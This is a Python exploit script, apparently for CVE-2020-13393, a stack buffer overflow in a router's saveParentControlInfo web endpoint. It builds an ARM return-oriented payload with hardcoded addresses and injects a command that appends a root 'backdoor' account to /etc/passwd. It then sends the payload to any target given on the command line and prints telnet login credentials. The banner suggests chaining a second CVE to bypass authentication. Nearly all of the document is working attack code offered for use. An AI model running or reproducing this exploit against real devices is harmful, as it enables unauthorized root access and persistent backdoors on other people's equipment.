#!/usr/bin/env python3

import struct
import random
import sys
import requests

BANNER =r"""
__   ___       __                     __   __  
|  \ |__  |\ | /__` |  |    |     /\  |__) /__` 
|__/ |___ | \| .__/ \__/    |___ /~~\ |__) .__/ 
                                                

        CVE-2020-13393.py
        (*)  (CVE- -) exploit by Densu Labs
        
        - 

        CVEs: The vulnerability is a stack overflow on the time parameter of the saveParentControlInfo endpoint. Note that the
        affected endpoint normally requires authentication, but you can abuse CVE-2021-44971 to bypass it.
"""

def pack_32(addr: int) -> bytes:
    """Packs a 32-bit integer into little-endian bytes."""
    return struct.pack("<I", addr)

def generate_payload() -> bytes:
    """Generates the exploit payload."""
    timeto_addr = pack_32(0xbefff510)  # Address of the time_to string on the stack
    system_addr = pack_32(0x4025c270)  # Address of the system function
    cmd = "echo 'backdoor:$1$xyz$ufCh61iwD3FifSl2zK3EI0:0:0:injected:/:/bin/sh' >> /etc/passwd"
    cmd_str_addr = pack_32(0xbefff8e0)  # Address of the cmd string on the stack
    pop_r0_pc = pack_32(0x4023fb80)  # Address of 'pop {r0, pc}' gadget

    payload = b"A" * 880  # Padding
    payload += timeto_addr * 17  # Overwrite string pointers
    payload += pop_r0_pc  # Load cmd string address into r0
    payload += cmd_str_addr
    payload += system_addr
    payload += cmd.encode()  # Command string

    return payload

def send_exploit(target: str) -> None:
    """Sends the exploit to the target."""
    name = "test" + "".join(str(random.randint(0, 9)) for _ in range(5))
    url = f"http://{target}/goform/saveParentControlInfo?img/main-logo.png"
    data = {
        "deviceId": "00:00:00:00:00:02",
        "deviceName": name,
        "enable": 0,
        "time": generate_payload() + b"-1",
        "url_enable": 1,
        "urls": "x.com",
        "day": "1,1,1,1,1,1,1",
        "limit_type": 1,
    }
    try:
        res = requests.post(url, timeout=10, data=data)
        res.raise_for_status() # raise HTTPError for bad responses (4xx or 5xx)
        print("Exploit sent successfully.")

    except requests.exceptions.RequestException as e:
        print(f"Error sending exploit: {e}")
        print("Connection closed unexpectedly")

def main() -> None:
    """Main function to handle command-line arguments and execute the exploit."""
    print(BANNER)
    if len(sys.argv) != 2:
        print(f"Usage: {sys.argv[0]} IP:PORT")
        sys.exit(1)

    target = sys.argv[1]

    try:
        input("Press enter to send exploit")
        send_exploit(target)
        print("Done! Login to Telnet with backdoor:hunter2")
    except KeyboardInterrupt:
        print("\nExploit execution interrupted.")
    except Exception as e:
        print(f"An unexpected error occurred: {e}")
        print("Connection closed unexpectedly")

if __name__ == "__main__":
    main()
